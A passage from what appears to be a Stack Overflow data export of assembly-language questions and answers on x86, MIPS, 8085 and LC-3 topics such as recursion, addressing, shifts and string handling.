call    fibonacci   ; Calculate fibonacci for (EBX - 2)
mov EDX,EAX     ; EAX = (EAX + EBX)
pop EBX         ; Retrieve EBX from the stack

add ESI,EDX
mov EAX,ESI

jmp end
base:               ; Base case
mov EAX,1           ; The result would be 1

end:

pop     EBX         ; Restore previous parameter
pop     EBP         ; Release EBP
ret
</code></pre>

<p>It is a bit crude. I calculate fibonacci for <code>(parameter - 1)</code>, then I do it again for <code>(parameter - 2)</code>, and just add them up and put them into <code>EAX</code>.</p>

<p>It doesn't work:</p>

<pre><code>2 =&gt; 2
3 =&gt; 3
4 =&gt; 4
5 =&gt; 4
</code></pre>

<p>Fortunately I fixed the segmentation fault errors, but I probably broke something else doing that. Now I don't see what's the problem. Can you tell me why am I getting the wrong values?</p>

<p>One particular observation is that, for some reason, doing <code>mov ECX,EAX</code> gave me a segmentation fault error. That's why I used <code>ESI</code> instead. I'm not sure why, but I guess that it is related.</p>
","<p>Whenever you're dealing with recursion, you have to be very careful about what the next layer in the recursive chain will do to the state of the current layer (e.g. register values). I'd suggest rewriting the function as follows:</p>

<pre><code>fibonacci:
push    EBP         ; Retrieve parameter and put it
push    EBX         ; Save previous parameter
mov     EBP,ESP     ; into EBX register
add     EBP,12      ;
mov     EBX,[EBP]   ; EBX = Param

cmp     EBX,1       ; Check for base case
jle     base        ; It is base if (n &lt;= 1)

lea ecx,[ebx-1]
push ecx            ; push N-1
call    fibonacci   ; Calculate fibonacci for (EBX - 1)
pop ecx             ; remove N-1 off the stack

push eax            ; save the result of fibonacci(N-1)
lea ecx,[ebx-2]
push ecx            ; push N-2
call    fibonacci   ; Calculate fibonacci for (EBX - 2)
pop ecx             ; remove N-2 off the stack
pop ecx             ; ecx = fibonacci(N-1)
add eax,ecx         ; eax = fibonacci(N-2) + fibonacci(N-1)

jmp end
base:               ; Base case
mov EAX,1           ; The result would be 1

end:
pop     EBX         ; Restore previous parameter
pop     EBP         ; Release EBP
ret
</code></pre>
","19220813"
"gas: too many memory reference","6614","","<p>when compiling the instruction</p>

<pre><code>movl 4(%ebp), 8(%ebp)
</code></pre>

<p>i got 'too many memory referene', what's wrong with it??</p>
","<p>The number before the parenthesis is a byte offset (which causes a memory reference to occur), and you cannot have two of them with <code>movl</code>. You need to move the value temporarily to a register first.</p>

<pre><code>movl 4(%ebp), %ecx
movl %ecx, 8(%ebp)
</code></pre>
","2531695"
"MIPS assembly - Label value modification","6612","","<p>Is it possible in MIPS to change during execution the value of a label, or to create a label with certain value?</p>

<p>I ask this because when using the instruction <code>lw $a0, label($s0)</code> i want to increment the value of label +4 every time we loop, indicating the new memory address of the array. I am aware I can do <code>lw $a0, label+4($s0)</code> but the new value of label will not be stored.</p>

<p>Any advise? </p>
","<p>No. In MIPS you must have a constant outside the parentheses when dereferencing (poor wording). If it were possible to change the value of the label, then it would no longer be constant. To get around this, you could instead do something like</p>

<pre><code>la $t1, label          #t1 holds address of label
add $t1, $t1, $s0      #t1 now holds address of label + s0 offset
lw $a0, 0($t1)         #load word from t1's location

addi $t1, $t1, 4       #t1 was incremented by 4 bytes now
lw $a0, 0($t1)         #load the next word
</code></pre>

<p>It might be advisable to use addu if s0 will always be non-negative.</p>

<p>EDIT: You cannot change the value of a label. It is solely an alias for a location in memory. In the text section, it's an alias for the position of the following instruction. In the data section, it's an alias for the location in memory of the following space.</p>
","4082394"
"Setting a value to null in Assembly","6605","","<p>I'm trying to set a value in a register to null to later on test if some other value is null. I've looked around the internet to check what the representation of null is in IA32, however could not find anything properly.</p>

<p>Can anybody help?</p>
","<p>On IA-32, the general registers are simply bits that are mostly interpreted as integer values. They do not have additional states such as “null” in the sense of “not currently holding a value”. (Some architectures do have such additional states, and the floating-point registers in IA-32 can have such a state.)</p>

<p>If you want to set an IA-32 general register to a “no value” state, there is no way to do this.</p>

<p>If you want to set a register to a “null pointer” state, the same as the C NULL macro, then this is represented as zero in most C implementations.</p>
","20331665"
"How to write modulus (% in C++) in assembly language","6592","","<p>I do not know what instruction I have to use in order to translate %2   </p>

<pre><code>#include &lt;iostream&gt;
using namespace std;

int main () {
     int number;
     cin &gt;&gt; number;
     if (number % 2 == 0) {    // I cannot translate this part.
       cout &lt;&lt; ""Even\n"";
    }
    else {
       cout &lt;&lt; ""Odd\n"";
    }
    return 0;
 }
</code></pre>
","<p>Modulo is typically produced by the division instruction. However, taking modulo 2, 4, 8, 16, and so on is a special case: because the numbers are stored in the binary form, these checks can be done with an <code>AND</code> instruction.</p>

<p>The fastest way of checking divisibility by 2 is looking at the least significant bit of a value. Use <code>AND</code> instruction with the value of <code>1</code>, i.e. <code>number &amp; 1</code>. Its result is always the same as <code>number % 2</code>. Most modern compilers (and some archaic ones) will do this as an easy optimization.</p>

<p>For other powers of two, <code>AND</code> with that value minus one, i.e. for <code>x % 4</code> use <code>x &amp; 3</code>, for <code>x % 8</code> use <code>x &amp; 7</code>, and so on.</p>
","20149759"
"Can anyone help me interpret this simple disassembly from WinDbg?","6584","","<p>I got the following simple C++ code:</p>

<pre><code>#include &lt;stdio.h&gt;
int main(void)
{
    ::printf(""\nHello,debugger!\n"");
}
</code></pre>

<p>And from WinDbg, I got the following disassembly code:</p>

<pre><code>SimpleDemo!main:
01111380 55              push    ebp
01111381 8bec            mov     ebp,esp
01111383 81ecc0000000    sub     esp,0C0h
01111389 53              push    ebx
0111138a 56              push    esi
0111138b 57              push    edi
0111138c 8dbd40ffffff    lea     edi,[ebp-0C0h]
01111392 b930000000      mov     ecx,30h
01111397 b8cccccccc      mov     eax,0CCCCCCCCh
0111139c f3ab            rep stos dword ptr es:[edi]
0111139e 8bf4            mov     esi,esp
011113a0 683c571101      push    offset SimpleDemo!`string' (0111573c)
011113a5 ff15b0821101    call    dword ptr [SimpleDemo!_imp__printf (011182b0)]
011113ab 83c404          add     esp,4
011113ae 3bf4            cmp     esi,esp
011113b0 e877fdffff      call    SimpleDemo!ILT+295(__RTC_CheckEsp) (0111112c)
011113b5 33c0            xor     eax,eax
011113b7 5f              pop     edi
011113b8 5e              pop     esi
011113b9 5b              pop     ebx
011113ba 81c4c0000000    add     esp,0C0h
011113c0 3bec            cmp     ebp,esp
011113c2 e865fdffff      call    SimpleDemo!ILT+295(__RTC_CheckEsp) (0111112c)
011113c7 8be5            mov     esp,ebp
011113c9 5d              pop     ebp
011113ca c3              ret
</code></pre>

<p>I have some difficulties to fully understand it. What is the <strong><em>SimpleDemo!ILT</em></strong> things doing here?</p>

<p>What's the point of the instruction comparing ebp and esp at <strong><em>011113c0</em></strong>?</p>

<p>Since I don't have any local variables in main() function, why there's still a <strong><em>sub esp,0C0h</em></strong> at the loacation of <strong><em>01111383</em></strong>?</p>

<p>Many thanks.</p>

<h2>Update 1</h2>

<p>Though I still don't know what <strong><em>ILT</em></strong> means, but the __RTC_CheckESP is for runtime checks. These code can be elimiated by placing the following pragma before the <em>main()</em> function.</p>

<pre><code>#pragma runtime_checks( ""su"", off )
</code></pre>

<p>Reference: </p>

<p><a href=""http://msdn.microsoft.com/en-us/library/8wtf2dfz.aspx"" rel=""noreferrer"">http://msdn.microsoft.com/en-us/library/8wtf2dfz.aspx</a></p>

<p><a href=""http://msdn.microsoft.com/en-us/library/6kasb93x.aspx"" rel=""noreferrer"">http://msdn.microsoft.com/en-us/library/6kasb93x.aspx</a></p>

<h2>Update 2</h2>

<p>The <strong><em>sub esp,0C0h</em></strong> instruction allocate another 0C0h bytes extra space on the stack. Then EAX is filled with 0xCCCCCCCC, this is 4 bytes, since ECX=30h, 4*30h=0C0h, so the instruction <strong><em>rep stos dword ptr es:[edi]</em></strong> fill exactly the extra spaces with 0xCC. But what is this extra space on stack for? Is this some kind of safe belt? <strong><em>Also I notice that if I turn off the runtime check as Update 1 shows, there's still such extra space on stack, though much smaller. And this space is not filled with 0xCC.</em></strong></p>

<p>The assembly code without runtime check is like below:</p>

<pre><code>SimpleDemo!main:
00231250 55              push    ebp
00231251 8bec            mov     ebp,esp
00231253 83ec40          sub     esp,40h &lt;-- Still extra space allocated from stack, but smaller
00231256 53              push    ebx
00231257 56              push    esi
00231258 57              push    edi
00231259 683c472300      push    offset SimpleDemo!`string' (0023473c)
0023125e ff1538722300    call    dword ptr [SimpleDemo!_imp__printf (00237238)]
00231264 83c404          add     esp,4
00231267 33c0            xor     eax,eax
00231269 5f              pop     edi
0023126a 5e              pop     esi
0023126b 5b              pop     ebx
0023126c 8be5            mov     esp,ebp
0023126e 5d              pop     ebp
0023126f c3              ret
</code></pre>
","<p>I've annotated the assembler, hopefully that will help you a bit. Lines starting 'd' are debug code lines, lines starting 'r' are run time check code lines. I've also put in what I think a debug with no runtime checks version and release version would look like.</p>

<pre><code>  ; The ebp register is used to access local variables that are stored on the stack, 
  ; this is known as a stack frame. Before we start doing anything, we need to save 
  ; the stack frame of the calling function so it can be restored when we finish.
  push    ebp                   
  ; These two instructions create our stack frame, in this case, 192 bytes
  ; This space, although not used in this case, is useful for edit-and-continue. If you
  ; break the program and add code which requires a local variable, the space is 
  ; available for it. This is much simpler than trying to relocate stack variables, 
  ; especially if you have pointers to stack variables.
  mov     ebp,esp             
d sub     esp,0C0h              
  ; C/C++ functions shouldn't alter these three registers in this build configuration,
  ; so save them. These are stored below our stack frame (the stack moves down in memory)
r push    ebx
r push    esi
r push    edi                   
  ; This puts the address of the stack frame bottom (lowest address) into edi...
d lea     edi,[ebp-0C0h]        
  ; ...and then fill the stack frame with the uninitialised data value (ecx = number of
  ; dwords, eax = value to store)
d mov     ecx,30h
d mov     eax,0CCCCCCCCh     
d rep stos dword ptr es:[edi]   
  ; Stack checking code: the stack pointer is stored in esi
r mov     esi,esp               
  ; This is the first parameter to printf. Parameters are pushed onto the stack 
  ; in reverse order (i.e. last parameter pushed first) before calling the function.
  push    offset SimpleDemo!`string' 
  ; This is the call to printf. Note the call is indirect, the target address is
  ; specified in the memory address SimpleDemo!_imp__printf, which is filled in when
  ; the executable is loaded into RAM.
  call    dword ptr [SimpleDemo!_imp__printf] 
  ; In C/C++, the caller is responsible for removing the parameters. This is because
  ; the caller is the only code that knows how many parameters were put on the stack
  ; (thanks to the '...' parameter type)
  add     esp,4                 
  ; More stack checking code - this sets the zero flag if the stack pointer is pointing
  ; where we expect it to be pointing. 
r cmp     esi,esp               
  ; ILT - Import Lookup Table? This is a statically linked function which throws an
  ; exception/error if the zero flag is cleared (i.e. the stack pointer is pointing
  ; somewhere unexpected)
r call    SimpleDemo!ILT+295(__RTC_CheckEsp)) 
  ; The return value is stored in eax by convention
  xor     eax,eax               
  ; Restore the values we shouldn't have altered
r pop     edi
r pop     esi
r pop     ebx                   
  ; Destroy the stack frame
r add     esp,0C0h              
  ; More stack checking code - this sets the zero flag if the stack pointer is pointing
  ; where we expect it to be pointing. 
r cmp     ebp,esp               
  ; see above
r call    SimpleDemo!ILT+295(__RTC_CheckEsp) 
  ; This is the usual way to destroy the stack frame, but here it's not really necessary
  ; since ebp==esp
  mov     esp,ebp               
  ; Restore the caller's stack frame
  pop     ebp                   
  ; And exit
  ret                           


  ; Debug only, no runtime checks  
  push    ebp                   
  mov     ebp,esp             
d sub     esp,0C0h              
d lea     edi,[ebp-0C0h]        
d mov     ecx,30h
d mov     eax,0CCCCCCCCh     
d rep stos dword ptr es:[edi]   
  push    offset SimpleDemo!`string' 
  call    dword ptr [SimpleDemo!_imp__printf] 
  add     esp,4                 
  xor     eax,eax               
  mov     esp,ebp               
  pop     ebp                   
  ret                             


  ; Release mode (I'm assuming the optimiser is clever enough to drop the stack frame when there's no local variables)
  push    offset SimpleDemo!`string' 
  call    dword ptr [SimpleDemo!_imp__printf] 
  add     esp,4                 
  xor     eax,eax               
  ret                               
</code></pre>
","4025307"
"What does qword ptr [hexvalue] mean without a base register","6573","","<p>I was debugging CLR code in assembly, and got to a line</p>

<pre><code>mov rax, qword ptr [ff4053c0h]
</code></pre>

<p>I think <code>qword ptr [ff4053c0h]</code> refers to a string I'm interested in, but <code>ff4053c0h</code> is not a valid memory location. Reading about <code>qword ptr</code> it seems to reference an address based on a base register (e.g. <code>qword ptr [rsp+30h]</code> is 30 bytes into the stack), but I can't find what it means with no base register.</p>
","<p><strong>When no base register is provided</strong>, it means <code>data segment</code> (<a href=""http://www.osdata.com/system/physical/memory.htm"" rel=""nofollow noreferrer"">http://www.osdata.com/system/physical/memory.htm</a>). In your code, <code>mov rax, qword ptr [ff4053c0h]</code> means ""take 8 bytes from data segment offset FF4053C0h and put them in RAX"".</p>

<p>As you are pointing correctly, the presence of a base register like <code>rsp</code> clearly indicates stack segment. In your case, no base register means data segment.</p>

<p>Now, about the big number ""FF4053C0h"", which is ""4 282 405 824"", it's perfectly possible to have 4Gb of addressable memory (<a href=""http://wiki.osdev.org/Protected_Mode"" rel=""nofollow noreferrer"">http://wiki.osdev.org/Protected_Mode</a>), which confirms that your line of code might be valid and it's accessing offset FF4053C0h in a huge data segment (<a href=""http://www.ece.unm.edu/~jimp/310/slides/micro_arch2.html"" rel=""nofollow noreferrer"">http://www.ece.unm.edu/~jimp/310/slides/micro_arch2.html</a>).</p>

<p>Another source = <a href=""https://stackoverflow.com/questions/4903906/assembly-using-the-data-segment-register-ds"">Assembly: Using the Data Segment Register (DS)</a> .</p>
","31211960"
"x86 NASM 'org' directive meaning","6569","","<p>I am following this tutorial as a first foray into bootloader/OS development for x86 using NASM:</p>

<p><a href=""http://joelgompert.com/OS/TableOfContents.htm"" rel=""noreferrer"">http://joelgompert.com/OS/TableOfContents.htm</a></p>

<p>And I'm on Lesson 4, which is making my bootloader print the ""Hello, world"" string.
I'm not understanding the meaning of the <code>org</code> instruction (directive?).</p>

<p>As I understand it, <code>org</code> defines where the program being executed is loaded into memory. This is needed when using any sort of labels or relative addresses in the program.</p>

<p>Suppose I have a string defined with a label like this in my program:</p>

<pre><code>szHello db 'Hello, world!', 0
</code></pre>

<p>And I then later try to reference that label like this (only relevant snippets):</p>

<pre><code>org 0x7c00
xor ax, ax
mov ds, 0
...
mov si, szHello
lodsb
...
int 0x10 ; Print first character of szHello
</code></pre>

<p>My question is, why is that not equivalent to this? :</p>

<pre><code>org 0
mov ds, 0x7c00
...
mov si, szHello
lodsb
...
int 0x10
</code></pre>

<p>When I run the first example, my string appears correctly. The second example does not work.</p>

<p>Pointers to relevant documentation would also be greatly appreciated, if the issue is a conceptual problem on my part.</p>
","<p>0000:7C00 is not equivalent to 7C00:0000. The segment part is counted in paragraphs, not bytes. Try this instead:</p>

<pre><code>mov ax, 0x7c0 
mov ds, ax
</code></pre>
","8140372"
"MIPS Programming: Load Address","6567","","<h3>The Background</h3>

<p>I am a student just beginning to learn MIPS for one of my courses, and my professor is not allowing the usage of pseudo-instructions such as Load Address (<code>la</code>) in our code.  I am wondering what an example of the correct usage of standard instructions would look like to store the address of a declared variable into a register for use later in the code.</p>

<h3>My Solution</h3>

<p>I have currently been attempting to use this code, though I am getting a syntax error in the <code>lui</code> instruction.</p>

<pre><code>main:
.data
    Array:
    .space 80             #Declares that Array will hold 20 integers
.text
    lui  $s0, Array       #loads most significant bits into $s0
    ori  $s0, $s0, Array  #loads least significant bits into $s0
</code></pre>

<h3>My Question</h3>

<p>From what I understand, this should result in the address of <code>Array</code> being placed into <code>$s0</code>.  However, as that does not seem to be the case, I'm wondering if anyone would be able to help me out on what I should be doing here.</p>
","<p>You need to refer to a label in the data section in the lui and ori instructions. The following works for gnu assembler (as):</p>

<pre><code>    .data
    Array:
    .space 80             #Declares that Array will hold 20 integers
...
.text
    lui $s0, %hi(Array)
    ori $s0, %lo(Array)
    lw  $s1, 0($s0)       # load 1st word of Array
...
</code></pre>

<p>The %hi and %lo directives tell the linker what is going on, so that it can put the address of the label ""Array"" in the machine code.  (NOTE: this likely doesn't work for SPIM or MARS.)</p>

<p>See this <a href=""https://stackoverflow.com/questions/7264532/problem-loading-memory-address-only-using-real-instructions-in-mips-asm-on-mars?rq=1"">question</a>.</p>

<p><a href=""http://rads.stackoverflow.com/amzn/click/0120884216"" rel=""nofollow noreferrer"">See MIPS Run</a> is the canonical book on MIPS CPUs. This book explains the MIPS instruction set, CPU architecture and how they relate to MIPS Linux.</p>
","12850254"
"How do we compare two 2-byte binary numbers in 8085?","6562","","<p>I have to write a microprocessor 8085 assembly language code for the following:-</p>

<p>Population censuses of 6 countries are stored in 18 locations starting from 2400H/0C20H. The first byte is the code number(which can be from 00H to 05H) and the next 2 bytes are the population of the country in binary (so that each country occupies 3 locations). I have to find the country which has the maximum population, and store it's country code number in location 2500H/0C90H.</p>

<p>I have searched all over the internet but couldn't find how do we compare two 2-byte binary numbers in 8085 ? Would be very thankful if you could help.</p>
","<p>On a 8-bit CPU you compare the first (= highest) byte. If it is equal you compare the second (= lower) byte. When comparing 32- or 64-bit numbers you continue with the third byte and so on. You stop comparison when the bytes are not equal.</p>

<p>On the Z80 you could also use the instruction ""SBC HL,DE"" to do a 16-bit comparison. However this instruction is not present on 8085.</p>

<p>An example for 8-bit processors:</p>

<pre><code> LOAD register1, [high byte of A]
 LOAD register2, [high byte of B]
 COMPARE register1, register2
 JUMP_IF_EQUAL was_equal
   // -- This is used for 32- and 64-bit numbers only --
 LOAD register1, [second byte of A]
 LOAD register2, [second byte of B]
 COMPARE register1, register2
 JUMP_IF_EQUAL was_equal
   ...
   // -- --
 LOAD register1, [low byte of A]
 LOAD register2, [low byte of B]
 COMPARE register1, register2
was_equal:
  // Here the status flags are set as if a 16-bit UNSIGNED
  // COMPARE had been done.
</code></pre>

<p>Replace the instructions ""LOAD"" etc. by the correct instructions of your processor!</p>

<p>A signed number comparison is more difficult!</p>
","19088886"
"Why did GCC generate mov %eax,%eax and what does it mean?","6556","","<p>GCC 4.4.3 generated the following x86_64 assembly. The part that confuses me is the <code>mov %eax,%eax</code>. Move the register to itself? Why?</p>

<pre><code>   23b6c:       31 c9                   xor    %ecx,%ecx        ; the 0 value for shift
   23b6e:       80 7f 60 00             cmpb   $0x0,0x60(%rdi)  ; is it shifted?
   23b72:       74 03                   je     23b77
   23b74:       8b 4f 64                mov    0x64(%rdi),%ecx  ; is shifted so load shift value to ecx
   23b77:       48 8b 57 38             mov    0x38(%rdi),%rdx  ; map base
   23b7b:       48 03 57 58             add    0x58(%rdi),%rdx  ; plus offset to value
   23b7f:       8b 02                   mov    (%rdx),%eax      ; load map_used value to eax
   23b81:       89 c0                   mov    %eax,%eax        ; then what the heck is this? promotion from uint32 to 64-bit size_t?
   23b83:       48 d3 e0                shl    %cl,%rax         ; shift rax/eax by cl/ecx
   23b86:       c3                      retq   
</code></pre>

<p>The C++ code for this function is:</p>

<pre><code>    uint32_t shift = used_is_shifted ? shift_ : 0;
    le_uint32_t le_map_used = *used_p();
    size_t map_used = le_map_used;
    return map_used &lt;&lt; shift;
</code></pre>

<p>An <code>le_uint32_t</code> is a class which wraps byte-swap operations on big-endian machines. On x86 it does nothing. The <code>used_p()</code> function computes a pointer from the map base + offset and returns a pointer of the correct type.</p>
","<p>In x86-64, 32-bit instructions implicitly zero-extend: bits 32-63 are cleared.  So sometimes thats why you'll see odd-looking instructions.</p>

<p>However, the previous <code>mov</code> is also 32-bit, so the high half of <code>%rax</code> is already cleared.  The <code>mov %eax,%eax</code> appears to be a NOP.</p>
","11910599"
"Reverse Engineering an ELF Binary","6554","","<p>I have a binary from a potential exploit that was found on a server. I am interested in reversing it to see exactly what this binary was designed to attempt to exploit. My only problem is OBJDump and other similar programs will all return errors indicating that the file cannot be read. Hex dump shows that an ELF header does exist in the file however I am not proficient enough to identify if the ELF is properly build based purely off the hex.</p>
","<p>Try <a href=""http://www.hex-rays.com/products/ida/index.shtml"" rel=""nofollow"">IDA</a> (Interactive Disassembler). <a href=""http://www.hex-rays.com/products/ida/support/download_demo.shtml"" rel=""nofollow"">Demo versions</a> can open ELF files. (I'm not sure if <a href=""http://www.hex-rays.com/products/ida/support/download_freeware.shtml"" rel=""nofollow"">freeware</a> can, and it's Windows only). We work hard on making it accept damaged/deliberately corrupted files, so if it can't be loaded by IDA but works in the actual OS, I'll be interested in a sample.</p>

<p>Disclaimer: I work for Hex-Rays.</p>
","11613975"
"Decompiling an ARM asm back to C","6538","","<p>I wrote a nice ARM assembler routine a few years back and it has done its job beautifully over the years on the ARM embedded systems it was designed for.  Now, the time has come to port it on to non-ARM systems and I was wondering if there was tool or some sort of method to take my original ARM assembler source and get a rudimentory C file from it.  I could probably do it myself in a couple of days, but it would be nice to have a starting point.  Nicer still if the app or method was free :)</p>

<p>Any suggestions?</p>
","<p>I don't know such a tool unfortunately... Would be nice... ; )</p>

<p>So the only suggestion I can give is to concentrate on the logic.</p>

<p>You wrote assembly code. So you know what to code is supposed to do. Converting it to C code shouldn't be that hard, even with ARM assembly.</p>

<p>I mean porting C to ARM assembly can be a difficult task. But for the reverse option, if you know the code logic, and if you know how to write C, it should be just ok...</p>

<p>Creates C structures to ease the memory regions you are working with. About the algorithms, they won't change. Just translate what you are doing from assembly to C, with the help of some structs, etc...</p>

<p>Sorry I can give you such a tool...</p>

<p>Good luck : )</p>
","3197844"
"Combine Two Strings to one address in MIPS Assembly","6531","","<p>I have a MIPS program I am writing, in which the user types in their first name, then last name, and then the system prints out their full name.</p>

<p>I store both names in seperate registers, but I need to combine them to one before I print the full name out. </p>

<p>Any help would be appreciated. Code is below:</p>

<pre><code>.data
first:.asciiz ""Please enter your first name: \n""
last:.asciiz ""Please enter your last name: \n""
full:.asciiz ""Your full name is: ""
.text 
main:
#    First Name
li $v0, 4              # 4 prints a line
la $a0, first          # Print first name text
syscall                # Syscall

add $a1, $a1, 254      # Setting String length 
li $v0, 8              # 8 will read string
syscall                # calls the word
sw $v0, first
move $v0, $t1          # The name is now in $t1

#   Last Name
li $v0, 4              # 4 prints a line
la $a0, last           # Print last name text
syscall                # Syscall

li $v0, 8              # 8 will read string
syscall                # calls the word
sw $v0, last
move $v0, $t2          # The name is now in $t2

#    Full Name
li $v0, 4              # 4 prints a line
la $a0, full           # Print full name text
syscall  

    # Combine first and last name below
</code></pre>
","<p>The first thing that needs to be said here is that you're using the read-string system call wrong. You seem to think that the system call is returning an address in $v0, and this is not the case. You can find some info on MIPS system calls <a href=""http://courses.missouristate.edu/kenvollmar/mars/help/syscallhelp.html"" rel=""nofollow"">here</a>.</p>

<p>The second is that you appear to be attempting to re-use the memory you reserved for your prompts for the user's first and last names. This is a bad idea.</p>

<p>The first thing is to fix your data segment:</p>

<pre><code>.data

fprompt:.asciiz ""Please enter your first name: ""
lprompt:.asciiz ""Please enter your last name: ""
oprompt:.asciiz ""Your full name is: ""
first: .space 255 #255 bytes for first name
last:  .space 255 #255 bytes for last name
full:  .space 512 #512 bytes for full name
</code></pre>

<p>Next, the main function has to be fixed as the wrong convention for the read string call is being used:</p>

<pre><code>main:

    #Prompt for first name
    li $v0, 4
    la $a0, fprompt
    syscall

    #Enter first name
    la $a0, first
    li $a1, 255
    li $v0, 8
    syscall

    #Prompt for last name
    li $v0, 4
    la $a0, lprompt
    syscall

    #Enter last name
    la $a0, last
    li $a1, 255
    li $v0, 8
    syscall

    #Display output lead-up
    li $v0, 4
    la $a0, oprompt
    syscall

    #call the strcpy function
    move $s0 $ra
    la $a0 first
    la $a1 last
    la $a2 full
    jal strcpy
    move $ra $s0

    #display the full string
    la $a0 full
    li $v0 4
    syscall

    #display a new-line
    li $a0 10
    li $v0 11
    syscall

    #exit
    jr $ra
</code></pre>

<p>Finally, for the meet of the question is how to concatenate two strings. For this I used a separate function called strcpy (which should be noted does NOT perform the same as C's strcpy). The strcpy takes the 2 input strings in $a0 and $a1 and copies them to $a2. It also throws a space in between for good measure.</p>

<pre><code>strcpy:

    li $t8 10 #store newline in $t8

    #loop through first string and copy to output string
   sCopyFirst:

        lb   $t0 0($a0)
        beq  $t0 $zero sCopySpace #exit loop on null byte
        beq  $t0 $t8 sCopySpace   #exit loop on new-line
        sb   $t0 0($a2)
        addi $a0 $a0 1
        addi $a2 $a2 1
        b sCopyFirst

    sCopySpace:

        li   $t0 ' '
        sb   $t0 0($a2)
        addi $a2 $a2 1 

    #loop through second string and copy to output string 
    sCopySecond:

        lb   $t0 0($a1)
        beq  $t0 $zero sDone #exit on null byte
        beq  $t0 $t8 sDone   #exit on new-line
        sb   $t0 0($a2)
        addi $a1 $a1 1
        addi $a2 $a2 1
        b sCopySecond

    sDone:

        sb $zero 0($a2) #null terminate string
        jr $ra
</code></pre>
","18808627"
"First time learning assembly, is this saying a word size is 8-bytes?","6525","","<p>When I break main it looks like the bold line is where i is being created and initialized. I think I'm going at this all wrong, I'm trying to examine x86_64 assembly from a book that is explaining x86. This seems weird and I'm pretty sure I just don't understand seeing as in this book he says he'll refer to a word and dword as 4-bytes. If I could get an explanation to aid my incognisance it would be greatly appreciated.
<code> </p>

<pre>    (gdb) list
    1   #include &lt;stdio.h&gt;
    2   
    3   int main()
    4   {
    5       int i;
    6       for(i=0; i &lt; 10; i++)
    7       {
    8           printf(""Hello, world!\n"");
    9       }
    10      return 0;
    (gdb) disassemble main
    Dump of assembler code for function main:
       0x0000000100000f10 &lt;+0&gt;: push   rbp
       0x0000000100000f11 &lt;+1&gt;: mov    rbp,rsp
       0x0000000100000f14 &lt;+4&gt;: sub    rsp,0x10
       0x0000000100000f18 &lt;+8&gt;: mov    DWORD PTR [rbp-0x4],0x0
       0x0000000100000f1f &lt;+15&gt;:    mov    DWORD PTR [rbp-0x8],0x0
       0x0000000100000f26 &lt;+22&gt;:    cmp    DWORD PTR [rbp-0x8],0xa
       0x0000000100000f2d &lt;+29&gt;:    jge    0x100000f54 &lt;main+68&gt;
       0x0000000100000f33 &lt;+35&gt;:    lea    rdi,[rip+0x48]        # 0x100000f82
       0x0000000100000f3a &lt;+42&gt;:    mov    al,0x0
       0x0000000100000f3c &lt;+44&gt;:    call   0x100000f60
       0x0000000100000f41 &lt;+49&gt;:    mov    DWORD PTR [rbp-0xc],eax
       0x0000000100000f44 &lt;+52&gt;:    mov    eax,DWORD PTR [rbp-0x8]
       0x0000000100000f47 &lt;+55&gt;:    add    eax,0x1
       0x0000000100000f4c &lt;+60&gt;:    mov    DWORD PTR [rbp-0x8],eax
       0x0000000100000f4f &lt;+63&gt;:    jmp    0x100000f26 &lt;main+22&gt;
       0x0000000100000f54 &lt;+68&gt;:    mov    eax,0x0
       0x0000000100000f59 &lt;+73&gt;:    add    rsp,0x10
       0x0000000100000f5d &lt;+77&gt;:    pop    rbp
       0x0000000100000f5e &lt;+78&gt;:    ret    
    End of assembler dump. &lt;/code&gt;
</code></pre>
","<p>The terms used to describe sizes in the x86 architecture are:</p>

<ul>
<li><code>byte</code>: 8 bits</li>
<li><code>word</code>: 2 bytes</li>
<li><code>dword</code>: 4 bytes (stands for ""double word"")</li>
<li><code>qword</code>: 8 bytes (stands for ""quad word"")</li>
</ul>

<p>This is somewhat at odds with the usual meaning of ""word"": the 16-bit nature of <code>word</code> is a result of the evolution of x86 machines from their 16 bit origins, not a reflection of the natural word size of the machine. For compatibility reasons the size of a <code>word</code> operand must always remain the same, even on a 64-bit machine.</p>

<p>Note that the variable <code>i</code> in your program is 32 bits: you can see <code>dword</code> size annotations in the relevant stack accesses. It may be instructive to recompile your program with the type of <code>i</code> changed to <code>long int</code>.</p>
","20273175"
"NASM shift operators","6524","","<p>How would you go about doing a bit shift in NASM on a register? I read the manual and it only seems to mention these operators <strong>>></strong>, <strong>&lt;&lt;</strong>. When I try to use them NASM complains about the shift operator working on scalar values. Can you explain what a scalar value is and give an example of how to use <strong>>></strong> and <strong>&lt;&lt;</strong>. Also, I thought there were a <strong>shr</strong> or <strong>shl</strong> operators. If they do exist can you give an example of how to use them? Thank you for your time.</p>
","<p><code>&lt;&lt;</code> and <code>&gt;&gt;</code> are for use with integer constants only. This is what it means by ""scalar value"". You can shift the value in a register using the <code>shl</code> or <code>shr</code> instructions. They are used to shift the value in a register left or right, respectively, a given number of bits.</p>

<p>The first line in this example shifts the value in <code>ax</code> left 4 bits, which is the same as multiplying it by 16. The second line shifts the value in <code>bx</code> right by 2 bits, which is the same as integer division by 4.</p>

<pre><code>shl ax, 4
shr bx, 2
</code></pre>

<p>You can also use <code>cl</code> to indicate the number of bits to shift, instead of a constant. For more information on these and related instructions, see <a href=""http://www.arl.wustl.edu/~lockwood/class/cs306/books/artofasm/Chapter_6/CH06-3.html#HEADING3-42"" rel=""nofollow"">this page</a>.</p>
","9960579"
"Iterate through memory editing each byte","6508","","<p>I'm writing assembly code that prompts the user for a string of lower-case characters then outputs the same string with all UPPER-CASE characters. My idea is to iterate through the bytes starting at a specific address and subtract 20H (turns a lower case to upper-case) from each one until I reach a byte with a specific value. I'm fairly inexperienced with Assembly so I'm not sure what the syntax for such a loop would look like.</p>

<p>Can anyone provide some sample code or direct me where I can find examples of such syntax?</p>

<p>Any help is greatly appreciated!</p>
","<p>Typically, a string is terminated with a null (0x00 in hex). Assuming this is what you choose to do, here's some sample code. I'm not sure which assembler you're using, or even which syntax, but this x86 code that should work in MASM:</p>

<pre><code>mov cl, 0             ; cl is the counter register, set it to
                      ; zero (the first character in the string)

start:                ; Beginning of loop
  mov al, bytes[cl]   ; Read the next byte from memory

  cmp al, 0           ; Compare the byte to null (the terminator)
  je end              ; If the byte is null, jump out of the loop

  sub al, 20h         ; Convert to upper case
                      ; A better solution would be: and al, 0DFh

  ; Output the character in al

  add cl, 1           ; Move to the next byte in the string
  jmp start           ; Loop
end:
</code></pre>
","7614431"
"Print contents of register to console in LC3 Assembly","6507","","<p>Say I have a value (eg. 1234) that I load into R0. How could I print this value to the console? </p>
","<p>I'm assuming you would like to print a number out to the console but you're getting random characters if anything. </p>

<p>This happens when the LC3 tries to interpret your number as an ASCII character. Example: The number 8 in ASCII is the backspace character. </p>

